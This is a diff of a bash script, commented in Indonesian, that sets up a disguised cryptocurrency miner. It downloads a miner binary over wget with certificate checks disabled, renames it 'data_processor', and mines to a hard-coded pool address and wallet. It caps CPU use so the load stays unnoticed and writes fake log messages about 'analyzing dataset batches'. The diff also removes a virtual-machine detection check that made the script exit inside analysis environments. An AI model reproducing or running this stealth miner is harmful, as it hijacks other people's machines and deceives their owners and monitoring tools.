@@ -1,23 +1,16 @@
 #!/bin/bash
 set -e
 
+# ====[ KONFIGURASI MINER ]====
 WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi"
 POOL="stratum+tcps://159.223.48.143:443"
 ALGO="power2b"
 FAKE_NAME="data_processor"
 THREADS_MAX=$(nproc)
 LOGFILE="processor.log"
+THROTTLE_PERCENT=65  # Maksimal penggunaan CPU
 
-# CPU USAGE CONTROL
-THROTTLE_PERCENT=65  # Target max CPU usage
-
-# === Virtualization Bypass ===
-if grep -qaE 'vmware|virtualbox|qemu|hypervisor' /proc/cpuinfo /sys/class/dmi/id/* 2>/dev/null; then
-    echo "[!] Virtualized environment detected. Exiting..." >> "$LOGFILE"
-    exit 0
-fi
-
-# Unduh miner jika belum ada
+# ====[ UNDUH DAN PERSIAPKAN BINARY MINER ]====
 if [ ! -f "$FAKE_NAME" ]; then
     wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
     tar -xf cpuminer-opt-linux.tar.gz
@@ -25,7 +18,7 @@ if [ ! -f "$FAKE_NAME" ]; then
     chmod +x "$FAKE_NAME"
 fi
 
-# Function throttle CPU usage adaptif
+# ====[ BATASI PENGGUNAAN CPU AGAR TIDAK MENONJOL ]====
 cpu_throttle() {
     while true; do
         sleep 15
@@ -38,7 +31,7 @@ cpu_throttle() {
     done
 }
 
-# Loop disguise
+# ====[ LOG PENYAMARAN ]====
 echo "[*] Loading data processor module..." | tee "$LOGFILE"
 sleep 1
 echo "[*] Connecting to secure data socket..." | tee -a "$LOGFILE"
@@ -46,6 +39,7 @@ sleep 1
 echo "[*] Starting threaded analysis engine ($THREADS_MAX workers)" | tee -a "$LOGFILE"
 sleep 1
 
+# ====[ MAIN LOOP: MINING DENGAN LOG SEOLAH PEMROSES DATA ]====
 while true; do
     echo "[*] Analyzing dataset batch @$(date '+%T')" | tee -a "$LOGFILE"
     ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS_MAX >> /dev/null 2>&1 &
